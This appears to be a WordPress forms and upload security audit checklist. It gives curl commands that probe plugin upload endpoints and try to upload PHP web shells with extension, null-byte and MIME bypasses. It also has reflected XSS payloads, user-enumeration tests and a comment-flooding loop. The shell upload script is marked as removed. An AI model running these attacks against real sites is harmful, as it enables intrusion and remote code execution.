# WordPress Forms & Upload Security Audit Checklist

**Type:** Remote, No authentication required  
**Target:** WordPress sites (all versions)  
**Severity Scale:** Critical / High / Medium / Low / Info  
**Last Updated:** 2026-07-16

---

## Table of Contents

1. [Upload Endpoint Detection](#1-upload-endpoint-detection)
2. [Unrestricted File Upload Test](#2-unrestricted-file-upload-test)
3. [Upload Directory Browsing](#3-upload-directory-browsing)
4. [Contact Form 7 Detection & Exploitation](#4-contact-form-7-detection--exploitation)
5. [Gravity Forms Detection & Exploitation](#5-gravity-forms-detection--exploitation)
6. [Elementor Form Detection & Exploitation](#6-elementor-form-detection--exploitation)
7. [WPForms / Fluent Forms / Forminator Detection](#7-wpforms--fluent-forms--forminator-detection)
8. [Comment Form Vulnerabilities](#8-comment-form-vulnerabilities)
9. [Search Form XSS Test](#9-search-form-xss-test)
10. [Login Form Security Analysis](#10-login-form-security-analysis)
11. [Registration Form Security](#11-registration-form-security)
12. [Lost Password Form, User Enumeration](#12-lost-password-form--user-enumeration)
13. [Upload Test Matrix](#13-upload-test-matrix)

---

## 1. Upload Endpoint Detection

### 1.1 Plugin Upload Handlers

Scan for known upload endpoints in common plugin directories.

```bash
# Detect common upload handler files in plugins
curl -sI "https://<TARGET>/wp-content/plugins/contact-form-7/modules/file.php"
curl -sI "https://<TARGET>/wp-content/plugins/cf7-conditional-fields/scripts/upload.php"
curl -sI "https://<TARGET>/wp-content/plugins/gravityforms/includes/upload.php"
curl -sI "https://<TARGET>/wp-content/plugins/elementor-pro/assets/lib/file-upload/file-upload.php"
curl -sI "https://<TARGET>/wp-content/plugins/wpforms/pro/includes/fields/class-file-upload.php"
curl -sI "https://<TARGET>/wp-content/plugins/fluentform/app/Services/Integrations/FileUpload.php"
curl -sI "https://<TARGET>/wp-content/plugins/forminator/library/fields/upload.php"
curl -sI "https://<TARGET>/wp-content/plugins/woocommerce/includes/class-wc-upload.php"
curl -sI "https://<TARGET>/wp-content/plugins/wp-file-upload/wp-file-upload.php"
curl -sI "https://<TARGET>/wp-content/plugins/user-submitted-posts/inc/upload.php"
```

**Detection via wildcard scan (if server allows):**

```bash
# Use HTTP HEAD to check multiple endpoints
for f in upload.php file-upload.php class-upload.php; do
  for plugin in contact-form-7 gravityforms elementor-pro wpforms fluentform forminator woocommerce; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "https://<TARGET>/wp-content/plugins/$plugin/$f")
    [ "$code" != "404" ] && echo "[$code] /wp-content/plugins/$plugin/$f"
  done
done
```

**Expected Response:**
- **200/301** → Endpoint exists (risk depending on access controls)
- **403** → Endpoint exists but access restricted (may still be exploitable)
- **404** → Not found

**Severity:** High (presence of upload handlers increases attack surface)

---

### 1.2 `admin-ajax.php` Upload Actions

Detect AJAX actions that handle file uploads. Requires some prior knowledge of the site's active plugins.

```bash
# Generic test, POST to admin-ajax.php with typical upload action
curl -sv "https://<TARGET>/wp-admin/admin-ajax.php" \
  -H "Content-Type: multipart/form-data" \
  -d "action=upload-file" 2>&1 | grep -E "(HTTP/|done|upload|error)"

# Try common plugin AJAX upload actions
for action in \
  "upload-file" \
  "wpcf7_upload_file" \
  "gf_upload_file" \
  "elementor_upload_file" \
  "wpforms_upload_file" \
  "fluentform_upload_file" \
  "forminator_upload_file" \
  "wfu_upload_file" \
  "usp_upload_file" \
  "wp_ajax_custom_upload" \
  "upload_attachment" \
  "wp_handle_upload"; do
  resp=$(curl -s "https://<TARGET>/wp-admin/admin-ajax.php" \
    -d "action=$action" \
    -o /dev/null -w "%{http_code}")
  echo "[$resp] action=$action"
done
```

**Expected Response:**
- **200 with JSON** → Action may be registered (inspect response body)
- **0 / empty** → Action doesn't exist or requires auth

**Severity:** Critical (if unauthenticated AJAX upload actions exist)

---

### 1.3 WordPress REST API Media Endpoint

The `/wp-json/wp/v2/media` endpoint allows file upload with `Content-Disposition: attachment` when authentication is available. Test for anonymous access.

```bash
# Test anonymous access to media endpoint
curl -s "https://<TARGET>/wp-json/wp/v2/media" | jq .

# Test with POST (should require auth)
curl -sv "https://<TARGET>/wp-json/wp/v2/media" \
  -X POST \
  -H "Content-Disposition: attachment; filename=test.txt" \
  -H "Content-Type: text/plain" \
  --data "test" 2>&1 | grep -E "(HTTP/|rest_|code|message|status)"

# Check if media endpoint is publicly accessible
curl -s "https://<TARGET>/wp-json/wp/v2/media?per_page=1" | jq '.[0].id'
```

**Expected Response:**
- **200 with media array** → Endpoint accessible (normal, read-only)
- **401/403 on POST** → Authentication required (secure)
- **201 on POST** → **CRITICAL**, anonymous file upload allowed!

**Severity:** Critical (if POST works without authentication)

---

## 2. Unrestricted File Upload Test

### 2.1 Direct Upload Handler Testing

Attempt to upload executable files to known endpoints.

```bash
# Test PHP upload to Contact Form 7 file handler
curl -sv "https://<TARGET>/wp-content/plugins/contact-form-7/modules/file.php" \
  -F "file=@shell.php;type=application/x-php" 2>&1 | grep -E "(HTTP/|Location|URL|error)"

# Test via admin-ajax.php upload action
curl -sv "https://<TARGET>/wp-admin/admin-ajax.php" \
  -F "action=upload-file" \
  -F "file=@shell.php;type=application/x-php" 2>&1 | grep -E "(HTTP/|Location|URL|error|success)"
```

### 2.2 Content-Disposition Bypass (REST API)

```bash
# Try uploading PHP via REST API with content-type manipulation
curl -sv "https://<TARGET>/wp-json/wp/v2/media" \
  -X POST \
  -H "Content-Disposition: attachment; filename=shell.php" \
  -H "Content-Type: image/jpeg" \
  -H "X-Requested-With: XMLHttpRequest" \
  --data-binary @shell.php 2>&1

# Try double extension bypass
curl -sv "https://<TARGET>/wp-json/wp/v2/media" \
  -X POST \
  -H "Content-Disposition: attachment; filename=shell.php.jpg" \
  -H "Content-Type: image/jpeg" \
  --data-binary @shell.php 2>&1
```

### 2.3 Null Byte Injection

```bash
# Null byte injection in filename
curl -sv "https://<TARGET>/wp-json/wp/v2/media" \
  -X POST \
  -H "Content-Disposition: attachment; filename=shell.php%00.jpg" \
  -H "Content-Type: image/jpeg" \
  --data-binary @shell.php 2>&1
```

### 2.4 MIME Type Manipulation

```bash
# Upload PHP file with image MIME type via multipart form
curl -sv "https://<TARGET>/wp-admin/admin-ajax.php" \
  -F "action=upload-file" \
  -F "file=@shell.php;type=image/jpeg" 2>&1

# Upload with Content-Type: application/octet-stream
curl -sv "https://<TARGET>/wp-admin/admin-ajax.php" \
  -F "action=upload-file" \
  -F "file=@shell.php;type=application/octet-stream" 2>&1
```

**Expected Response (all tests above):**
- **200 with {"success":true} + URL** → Upload successful, **CRITICAL**
- **200 with {"success":false}** → Upload blocked (verify why)
- **403** → Access denied (good)
- **302 redirect** → File accepted and stored (check Location header)

**Severity:** Critical (if any executable file type is accepted)

---

## 3. Upload Directory Browsing

### 3.1 Base Upload Directory

```bash
# Check for directory listing on wp-content/uploads/
curl -s "https://<TARGET>/wp-content/uploads/" | head -50

# Try common index file bypasses
curl -s "https://<TARGET>/wp-content/uploads/?d"
curl -s "https://<TARGET>/wp-content/uploads/?discover"
curl -s "https://<TARGET>/WP-CONTENT/UPLOADS/"
```

### 3.2 Year/Month Subdirectories

```bash
# Check various date-based subdirectories
for year in $(seq 2019 2026); do
  for month in $(seq -w 1 12); do
    code=$(curl -s -o /dev/null -w "%{http_code}" "https://<TARGET>/wp-content/uploads/$year/$month/")
    [ "$code" != "404" ] && echo "[$code] /wp-content/uploads/$year/$month/"
  done
done
```

### 3.3 File Enumeration via Directory Listing

If directory listing is ON:

```bash
# List all files in uploads directory (if listing enabled)
curl -s "https://<TARGET>/wp-content/uploads/" | grep -oP 'href="[^"]+\.(php|phtml|php5|shtml|asp|jsp|txt|log)"' | sort -u

# Check for exposed backup files in uploads
curl -s "https://<TARGET>/wp-content/uploads/" | grep -ioP 'href="[^"]*\.(zip|tar|gz|sql|bak|old|swp)"' | sort -u
```

### 3.4 Uploads Index File Analysis

```bash
# Check if uploads has an index.html (WP default) or index.php
curl -sI "https://<TARGET>/wp-content/uploads/index.html"
curl -sI "https://<TARGET>/wp-content/uploads/index.php"
```

**Expected Response:**
- **200 with file listing** → Directory browsing enabled, **High**
- **200 with blank page or "index of"** → Same, **High**
- **200 with WP-generated gallery** → Normal (but large listings reveal sensitive data)
- **403/404** → Directory listing disabled, **Good**

**Severity:** High (exposes uploaded files, may reveal PHP shells from prior attacks)

---

## 4. Contact Form 7 Detection & Exploitation

### 4.1 Plugin Detection & Version

```bash
# Check for CF7 plugin directory
curl -sI "https://<TARGET>/wp-content/plugins/contact-form-7/readme.txt"

# Read readme.txt for version info
curl -s "https://<TARGET>/wp-content/plugins/contact-form-7/readme.txt" | grep -i "stable tag\|version" | head -5

# Check plugin main file for version header
curl -s "https://<TARGET>/wp-content/plugins/contact-form-7/wp-contact-form-7.php" | grep -i "version" | head -5

# Check if CF7 CSS/JS is enqueued
curl -s "https://<TARGET>/" | grep -oP 'wp-content/plugins/contact-form-7/[^"]+' | sort -u

# Find CF7 stylesheet for version fingerprint
curl -s "https://<TARGET>/wp-content/plugins/contact-form-7/includes/css/styles.css" | head -20
```

### 4.2 File Upload Enabled Test

Detect if a CF7 form on the page has file upload fields enabled.

```bash
# Search for CF7 file upload fields in page source
curl -s "https://<TARGET>/" | grep -oP '(file|fileupload|wpcf7-file)[^"]*"'

# Look for wpcf7-form-control wpcf7-file class
curl -s "https://<TARGET>/" | grep -oP 'wpcf7-form-control wpcf7-file[^>]*>'

# Detect CF7 form in page with multipart encoding
curl -s "https://<TARGET>/" | grep -i "multipart/form-data"
```

### 4.3 CF7 File Upload Exploitation

```bash
# Attempt to upload through CF7 form handler (needs actual form ID)
# First find form IDs in page
curl -s "https://<TARGET>/" | grep -oP 'wpcf7-f[0-9]+' | sort -u

# Then try upload to a found form (replace F9999 with actual form ID)
curl -sv "https://<TARGET>/wp-json/contact-form-7/v1/contact-forms/F9999/feedback" \
  -F "file-upload=@shell.php;type=application/x-php" 2>&1

# Alternative: POST to the CF7 plugin's file handler directly
curl -sv "https://<TARGET>/wp-content/plugins/contact-form-7/modules/file.php" \
  -F "file=@shell.phtml;type=image/jpeg" 2>&1
```

**Expected Response:**
- **readme.txt 200** → Plugin exists (read version from Stable tag)
- **200 with {"status":"mail_sent"}** → Form processed
- **200 with {"status":"validation_failed"}** → Upload blocked by validation
- **200 with uploaded file URL in response** → **CRITICAL**

**Severity:** High to Critical (file upload capability + version = exploit vector)

---

## 5. Gravity Forms Detection & Exploitation

### 5.1 Plugin Detection & Version

```bash
# Check Gravity Forms directory
curl -sI "https://<TARGET>/wp-content/plugins/gravityforms/gravityforms.php"

# Version via readme
curl -s "https://<TARGET>/wp-content/plugins/gravityforms/readme.txt" | grep -i "stable tag\|version" | head -5

# Version via main plugin file
curl -s "https://<TARGET>/wp-content/plugins/gravityforms/gravityforms.php" | grep -i "version" | head -5

# Detect GF CSS/JS assets
curl -s "https://<TARGET>/" | grep -oP 'wp-content/plugins/gravityforms/[^"]+' | sort -u
```

### 5.2 File Upload Field in Page Source

```bash
# Search for Gravity Forms file upload fields
curl -s "https://<TARGET>/" | grep -oP 'gform_fileupload_multifile|gform_drop_area|ginput_container_fileupload'

# Look for GF form wrappers
curl -s "https://<TARGET>/" | grep -oP 'gform_wrapper[^"]*"' | head -5

# Detect multipart forms (file upload requires multipart encoding)
curl -s "https://<TARGET>/" | grep -oP 'enctype="multipart/form-data"' | head -5

# Find GF form IDs
curl -s "https://<TARGET>/" | grep -oP 'gform_[0-9]+' | sort -u
```

### 5.3 Gravity Forms Upload Exploitation

```bash
# GF handles uploads via admin-ajax.php
# Try the legacy upload action
curl -sv "https://<TARGET>/wp-admin/admin-ajax.php" \
  -F "action=gf_upload_file" \
  -F "form_id=1" \
  -F "field_id=1" \
  -F "file=@shell.php5;type=image/jpeg" 2>&1

# Try GF multipart upload endpoint (newer versions)
curl -sv "https://<TARGET>/wp-admin/admin-ajax.php" \
  -F "action=gf_upload" \
  -F "gform_upload=1" \
  -F "file=@shell.shtml;type=application/x-php" 2>&1
```

**Expected Response:**
- **readme.txt 200** → Plugin exists
- **200 with upload URL in response** → File accepted, **CRITICAL**
- **200 with {"success":true}** → Upload succeeded
- **403** → Blocked

**Severity:** High to Critical

---

## 6. Elementor Form Detection & Exploitation

### 6.1 Plugin Detection & Version

```bash
# Detect Elementor (free)
curl -sI "https://<TARGET>/wp-content/plugins/elementor/elementor.php"

# Detect Elementor Pro (forms are a Pro feature)
curl -sI "https://<TARGET>/wp-content/plugins/elementor-pro/elementor-pro.php"

# Version info
curl -s "https://<TARGET>/wp-content/plugins/elementor/readme.txt" | grep -i "stable tag\|version" | head -5
curl -s "https://<TARGET>/wp-content/plugins/elementor-pro/readme.txt" | grep -i "stable tag\|version" | head -5

# Detect Elementor frontend assets
curl -s "https://<TARGET>/" | grep -oP 'wp-content/plugins/elementor[^"]*' | sort -u
```

### 6.2 File Upload Detection in Elementor Forms

```bash
# Search for Elementor form upload field in page
curl -s "https://<TARGET>/" | grep -oP 'elementor-field-type-upload|elementor-field-type-file|elementor-upload-field'

# Find Elementor form wrappers
curl -s "https://<TARGET>/" | grep -oP 'elementor-form[^"]*"' | head -5

# Look for file upload accept attribute
curl -s "https://<TARGET>/" | grep -oP 'accept="[^"]*"' | head -10
```

### 6.3 Elementor Form Upload Exploitation

```bash
# Elementor Pro handles file uploads via action=elementor_upload_file
curl -sv "https://<TARGET>/wp-admin/admin-ajax.php" \
  -F "action=elementor_upload_file" \
  -F "file=@shell.php;type=image/jpeg" 2>&1

# Try with form data
curl -sv "https://<TARGET>/wp-admin/admin-ajax.php" \
  -F "action=elementor_pro_upload_file" \
  -F "form_id=test" \
  -F "file=@shell.phtml;type=application/octet-stream" 2>&1
```

**Expected Response:**
- **200 with {data: {url: ...}}** → Upload succeeded, **CRITICAL**
- **200 with error message** → Blocked
- **403** → No permission

**Severity:** High to Critical

---

## 7. WPForms / Fluent Forms / Forminator Detection

### 7.1 WPForms

```bash
# Plugin detection
curl -sI "https://<TARGET>/wp-content/plugins/wpforms-lite/wpforms.php"
curl -sI "https://<TARGET>/wp-content/plugins/wpforms/wpforms.php"

# Version detection
curl -s "https://<TARGET>/wp-content/plugins/wpforms-lite/readme.txt" | grep -i "stable tag\|version" | head -5
curl -s "https://<TARGET>/wp-content/plugins/wpforms/readme.txt" | grep -i "stable tag\|version" | head -5

# Frontend detection
curl -s "https://<TARGET>/" | grep -oP 'wpforms[_-][^"]+' | sort -u

# WPForms file upload field detection
curl -s "https://<TARGET>/" | grep -oP 'wpforms-field-file-upload|wpforms-field-upload'

# WPForms upload endpoint test
curl -sv "https://<TARGET>/wp-admin/admin-ajax.php" \
  -F "action=wpforms_upload_file" \
  -F "file=@shell.php;type=image/jpeg" 2>&1
```

### 7.2 Fluent Forms

```bash
# Plugin detection
curl -sI "https://<TARGET>/wp-content/plugins/fluentform/fluentform.php"

# Version detection
curl -s "https://<TARGET>/wp-content/plugins/fluentform/readme.txt" | grep -i "stable tag\|version" | head -5

# Frontend detection
curl -s "https://<TARGET>/" | grep -oP 'fluentform[_-][^"]+' | sort -u

# Fluent Forms file upload field detection
curl -s "https://<TARGET>/" | grep -oP 'ff-el-form-control ff-el-upload|fluent-upload-field'

# Fluent Forms upload action test
curl -sv "https://<TARGET>/wp-admin/admin-ajax.php" \
  -F "action=fluentform_upload_file" \
  -F "file=@shell.php5;type=image/png" 2>&1
```

### 7.3 Forminator

```bash
# Plugin detection
curl -sI "https://<TARGET>/wp-content/plugins/forminator/forminator.php"

# Version detection
curl -s "https://<TARGET>/wp-content/plugins/forminator/readme.txt" | grep -i "stable tag\|version" | head -5

# Frontend detection
curl -s "https://<TARGET>/" | grep -oP 'forminator[_-][^"]+' | sort -u

# Forminator upload field detection
curl -s "https://<TARGET>/" | grep -oP 'forminator-file-upload|forminator-field-upload'

# Forminator upload action test
curl -sv "https://<TARGET>/wp-admin/admin-ajax.php" \
  -F "action=forminator_upload_file" \
  -F "file=@shell.phtml;type=image/jpeg" 2>&1
```

**Severity (all three):** Medium (detection) / Critical (if unauthenticated file upload works)

---

## 8. Comment Form Vulnerabilities

### 8.1 No Nonce Check Detection

```bash
# POST a comment without a nonce
curl -sv "https://<TARGET>/wp-comments-post.php" \
  -d "author=Test" \
  -d "email=test@test.com" \
  -d "comment=Test+comment+without+nonce" \
  -d "comment_post_ID=1" 2>&1 | grep -E "(HTTP/|duplicate|error|spam|approved)"

# Check page source for comment nonce field
curl -s "https://<TARGET>/" | grep -oP 'wp_comment_nonce|_wp_unfiltered_html_comment|akismet_nonce'
```

**Expected Response:**
- **200 or 302 without nonce error** → Comment accepted without nonce, **High**
- **403/error "nonce failed"** → Nonce protection in place, **Good**
- **"Duplicate comment"** → Nonce or duplicate detection works

### 8.2 No Rate Limit Test

```bash
# Send rapid successive comments to test rate limiting
for i in $(seq 1 20); do
  curl -s "https://<TARGET>/wp-comments-post.php" \
    -d "author=Bot$i" \
    -d "email=bot$i@test.com" \
    -d "comment=Spam+comment+number+$i" \
    -d "comment_post_ID=1" \
    -w "%{http_code}" -o /dev/null &
done
wait
```

**Expected Response:**
- **All 200/302 accepted** → No rate limiting, **High**
- **429 or throttling after N requests** → Rate limiting present, **Good**

### 8.3 No Required Fields Bypass

```bash
# Submit comment with missing required fields
curl -sv "https://<TARGET>/wp-comments-post.php" \
  -d "comment=Comment+without+author" \
  -d "comment_post_ID=1" 2>&1

# Submit without comment_post_ID
curl -sv "https://<TARGET>/wp-comments-post.php" \
  -d "author=Test" \
  -d "email=test@test.com" \
  -d "comment=Test+comment+no+post+ID" 2>&1

# Submit with fake referer
curl -sv "https://<TARGET>/wp-comments-post.php" \
  -H "Referer: https://<TARGET>/some-page/" \
  -d "author=Test" \
  -d "email=test@test.com" \
  -d "comment=Test+with+referer" \
  -d "comment_post_ID=1" 2>&1
```

**Expected Response:**
- **200 (comment accepted)** → Validation gap, **High**
- **Error "Please fill the required fields"** → Validation works, **Good**

**Severity:** High (comment spam abuse, potential stored XSS vector)

---

## 9. Search Form XSS Test

### 9.1 Reflected XSS in Search Parameter

```bash
# Basic reflected XSS test
curl -s "https://<TARGET>/?s=<script>alert(1)</script>" | grep -i 'script>alert'

# URL-encoded XSS payload
curl -s "https://<TARGET>/?s=%3Cscript%3Ealert(1)%3C/script%3E" | grep -i 'script>alert'

# HTML entity encoded test, search term reflected in value attribute
curl -s "https://<TARGET>/?s=test%22onfocus=%22alert(1)%22autofocus=%22" | grep -oP 'value="[^"]*test[^"]*"'

# Check if search term is reflected without sanitization
curl -s "https://<TARGET>/?s=<img+src=x+onerror=alert(1)>" | grep -i 'onerror\|<img'

# Test for XSS in search results text
curl -s "https://<TARGET>/?s=SearchResultsForXSS" | grep -i "SearchResultsForXSS"
```

### 9.2 HTTP Parameter Pollution in Search

```bash
# Double parameter
curl -s "https://<TARGET>/?s=good&s=<script>alert(1)</script>" | grep -i 'script>'

# Array-style parameter
curl -s "https://<TARGET>/?s[]=<script>alert(1)</script>" | grep -i 'script>'
```

**Expected Response:**
- **Search term reflected unescaped in HTML** → **Critical** (reflected XSS)
- **Search term reflected but HTML-encoded** → Low (still information disclosure)
- **Search term not reflected** → Secure

**Severity:** Critical (if reflected XSS is confirmed)

---

## 10. Login Form Security Analysis

### 10.1 `autocomplete="off"` Check

```bash
# Check login page for autocomplete attributes
curl -s "https://<TARGET>/wp-login.php" | grep -oP 'autocomplete="[^"]*"'

# Check wp-admin login
curl -s "https://<TARGET>/wp-admin/" | grep -oP 'autocomplete="[^"]*"'

# Check login via custom page
curl -s "https://<TARGET>/" | grep -i "login" | head -10
```

**Expected Response:**
- `autocomplete="off"` on password fields → Password manager blocking, **Info/Low**
- No `autocomplete` attribute → Default browser behavior, **Info**
- `autocomplete="new-password"` → Modern best practice, **Good**

### 10.2 Password Field Analysis

```bash
# Check password field type and attributes
curl -s "https://<TARGET>/wp-login.php" | grep -oP '<input[^>]*password[^>]*>' | head -5

# Check for maxlength attribute on password field
curl -s "https://<TARGET>/wp-login.php" | grep -oP 'maxlength="[^"]*"' | head -5

# Check if password field has a pattern constraint (reveals policy)
curl -s "https://<TARGET>/wp-login.php" | grep -oP 'pattern="[^"]*"' | head -5
```

**Expected Response:**
- **`type="password"`** → Standard
- **`type="text"`** → **Critical** (password displayed in plaintext)
- **`maxlength` attribute** → Reveals password length constraint, **Info**
- **`pattern` attribute** → Reveals password complexity rules, **Info**

### 10.3 Placeholder Information Leakage

```bash
# Extract all placeholder text from login page
curl -s "https://<TARGET>/wp-login.php" | grep -oP 'placeholder="[^"]*"' | sort -u

# Check for informative placeholders
curl -s "https://<TARGET>/wp-login.php" | grep -oP 'placeholder="[^"]*"' | grep -viE '(Username|Password|Email)'
```

**Expected Response:**
- Standard placeholders (`"Username"`, `"Password"`, `"Email"`) → Normal
- Custom informative placeholders (`"Enter your 8+ character password"`) → Leaks password policy, **Low**
- Placeholder revealing field format (`"user@domain.com"`) → Normal

### 10.4 Login Error Message Analysis (User Enumeration Vector)

```bash
# Test with invalid username
curl -s "https://<TARGET>/wp-login.php" \
  -d "log=invaliduser999&pwd=test123" \
  -D - 2>&1 | grep -i "error\|invalid\|wrong"

# Check for different error messages (user enumeration)
error_invalid_user=$(curl -s "https://<TARGET>/wp-login.php" \
  -d "log=nonexistentuser_xyz&pwd=WrongPassword1" \
  -D - 2>&1 | grep -i "error\|invalid\|wrong")

error_valid_user=$(curl -s "https://<TARGET>/wp-login.php" \
  -d "log=admin&pwd=WrongPassword1" \
  -D - 2>&1 | grep -i "error\|invalid\|wrong")

echo "Invalid user: $error_invalid_user"
echo "Valid user (admin): $error_valid_user"
```

**Expected Response:**
- **"Invalid username"** vs **"Incorrect password"** → User enumeration possible, **High**
- **Same error for both** → Protected, **Good**
- **Redirect to /wp-admin/?reauth=1** → Different behavior, **Medium**

**Severity:** Medium (autocomplete) to High (user enumeration via error messages)

---

## 11. Registration Form Security

### 11.1 REST API Registration Endpoint

```bash
# Check if user registration is enabled via REST API
curl -s "https://<TARGET>/wp-json/wp/v2/users/register" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser_security_audit","password":"Test123456!","email":"testuser_audit@example.com"}' \
  -D - 2>&1

# Try with accept header
curl -s "https://<TARGET>/wp-json/wp/v2/users/register" -X POST \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{"username":"testuser_sec2","password":"Test123456!","email":"testuser2_audit@example.com"}' \
  -D - 2>&1
```

### 11.2 Standard Registration Page

```bash
# Check if registration page is accessible
curl -sI "https://<TARGET>/wp-login.php?action=register"

# Check registration form fields
curl -s "https://<TARGET>/wp-login.php?action=register" | grep -oP '<input[^>]*>' | head -20

# Check for registration nonce
curl -s "https://<TARGET>/wp-login.php?action=register" | grep -oP 'nonce|_wpnonce|register_nonce'
```

### 11.3 Registration with No Email Verification

```bash
# Attempt to register (read error messages carefully)
curl -sv "https://<TARGET>/wp-login.php?action=register" \
  -d "user_login=testuser_sec3" \
  -d "user_email=testuser3_audit@example.com" \
  -d "wp-submit=Register" 2>&1 | grep -E "(HTTP/|registered|error|success|already)"

# Check response body for user enumeration (already registered email reveals valid emails)
curl -s "https://<TARGET>/wp-login.php?action=register" \
  -d "user_login=admin" \
  -d "user_email=admin@example.com" \
  -d "wp-submit=Register" | grep -oi "already\|exists\|registered\|taken"
```

**Expected Response:**
- **201 Created** → Registration works, **High** (verify if requires approval)
- **400/403** → Registration disabled or requires capabilities
- **"Username already exists"** → User enumeration, **High**
- **"Email already registered"** → User enumeration, **High**
- **Same response for existing/new emails** → Protected, **Good**

**Severity:** High (registration without verification = account creation spam / enumeration)

---

## 12. Lost Password Form, User Enumeration

### 12.1 Different Error Messages Test

```bash
# Test with valid username
curl -s "https://<TARGET>/wp-login.php?action=lostpassword" \
  -d "user_login=admin" \
  -D - 2>&1 | grep -i "error\|message\|check\|email\|sent\|confirm"

# Test with invalid username
curl -s "https://<TARGET>/wp-login.php?action=lostpassword" \
  -d "user_login=nonexistent_user_xyz" \
  -D - 2>&1 | grep -i "error\|message\|check\|email\|sent\|confirm"

# Test with valid email
curl -s "https://<TARGET>/wp-login.php?action=lostpassword" \
  -d "user_login=admin@example.com" \
  -D - 2>&1 | grep -i "error\|message\|check\|email\|sent\|confirm"

# Test with invalid email
curl -s "https://<TARGET>/wp-login.php?action=lostpassword" \
  -d "user_login=nonexistent@example.com" \
  -D - 2>&1 | grep -i "error\|message\|check\|email\|sent\|confirm"
```

### 12.2 User Enumeration via Lost Password Confirmation

```bash
# Check the full response body for differences
valid_resp=$(curl -s "https://<TARGET>/wp-login.php?action=lostpassword" \
  -d "user_login=admin" \
  -o /tmp/wp_valid.txt -w "%{http_code}")

invalid_resp=$(curl -s "https://<TARGET>/wp-login.php?action=lostpassword" \
  -d "user_login=nonexistent_user_xyz" \
  -o /tmp/wp_invalid.txt -w "%{http_code}")

# Check for differences (user enumeration indicator)
diff /tmp/wp_valid.txt /tmp/wp_invalid.txt && echo "NO DIFFERENCE (protected)" || echo "DIFFERENCE FOUND (enumeration possible)"

# Count words to check for response length differences
wc -w /tmp/wp_valid.txt /tmp/wp_invalid.txt

# Cleanup
rm -f /tmp/wp_valid.txt /tmp/wp_invalid.txt
```

### 12.3 Username Enumeration via Password Reset Link

```bash
# Check if password reset link reveals username
curl -s "https://<TARGET>/wp-login.php?action=lostpassword" \
  -d "user_login=admin" \
  -D - 2>&1 | grep -i "location\|redirect"

# If redirected, check the URL for username in query string
curl -sv "https://<TARGET>/wp-login.php?action=lostpassword" \
  -d "user_login=admin" 2>&1 | grep -i "location:"
```

**Expected Response:**
- **"Password reset email sent"** for both valid and invalid → Protected, **Good**
- **"Invalid username"** vs **"Check your email"** → User enumeration, **High**
- **Different redirect URLs** → User enumeration, **High**
- **Username visible in reset link URL** → **Critical** (direct user enumeration)

**Severity:** High (user enumeration = first step in credential stuffing / brute force)

---

## 13. Upload Test Matrix

Test each file type against every discovered upload endpoint. Use the table below to record results.

### Test File Types

| Extension | MIME Type | Risk | Detection Difficulty |
|-----------|-----------|------|---------------------|
| `.php` | `application/x-php` | Critical, Direct RCE | Easy (extension blacklist) |
| `.phtml` | `application/x-httpd-php` | Critical, PHP execution | Medium (bypasses `.php` filter) |
| `.php5` | `application/x-php` | Critical, PHP execution | Medium |
| `.php7` | `application/x-php` | Critical, PHP execution | Medium |
| `.shtml` | `text/html` | High, SSI execution possible | Medium (rarely blocked) |
| `.asp` | `application/x-asap` | Medium, Windows/rare | Low (Linux ignores) |
| `.jsp` | `application/x-jsp` | Medium, Java server | Low |
| `.php.jpg` | `image/jpeg` | High, Double extension bypass | Hard (requires null byte or misconfig) |
| `.php\x00.jpg` | `image/jpeg` | High, Null byte injection | Hard (PHP < 5.3.4) |
| `.pHp` | `application/x-php` | High, Case bypass | Medium (case-insensitive OS only) |
| `.PhP5` | `application/x-php` | High, Case bypass | Medium |
| `.php.` | `application/x-php` | Medium, Trailing dot bypass | Hard (Windows/apache) |
| `.php;.jpg` | `image/jpeg` | Medium, Parameter injection | Hard (old IIS/nginx) |
| `.inc` | `text/plain` | Medium, Config exposure | Low |
| `.shtml` | `text/html` | High, Server-Side Includes | Medium |

### Test Matrix Template

| Endpoint | `.php` | `.phtml` | `.php5` | `.shtml` | `.asp` | `.jsp` | `.php.jpg` | `.pHp` | Notes |
|----------|--------|----------|---------|----------|--------|--------|------------|--------|-------|
| `admin-ajax.php?action=upload-file` | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | |
| `admin-ajax.php?action=wpcf7_upload_file` | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | |
| `admin-ajax.php?action=gf_upload_file` | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | |
| `admin-ajax.php?action=elementor_upload_file` | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | |
| `admin-ajax.php?action=wpforms_upload_file` | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | |
| `admin-ajax.php?action=fluentform_upload_file` | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | |
| `admin-ajax.php?action=forminator_upload_file` | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | |
| `/wp-json/wp/v2/media` (POST) | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | Requires auth |
| `/wp-content/plugins/.../file.php` | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | Direct handler |
| `wp-comments-post.php` | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | ✅/❌ | Comment attachment |

**Legend:** ✅ = Upload succeeded (vulnerable) | ❌ = Upload blocked (secure)

### Test Payload Script

> **Removed from the public edition.** The original script uploaded web shell samples to the target
> through the endpoints listed above. That is an active intrusion test: it changes the target's state
> and is only lawful under a written authorisation (penetration test engagement). wp_security_ForSure
> never performs it. See `docs/RESPONSIBLE_USE.md` and `19-legal-ethics.md`.

---

## Severity Summary

| # | Test | Severity | Description |
|---|------|----------|-------------|
| 1 | Upload Endpoint Detection | **High** | Increases attack surface; each endpoint is a potential bypass vector |
| 2 | Unrestricted File Upload | **Critical** | Direct RCE via PHP/webshell upload |
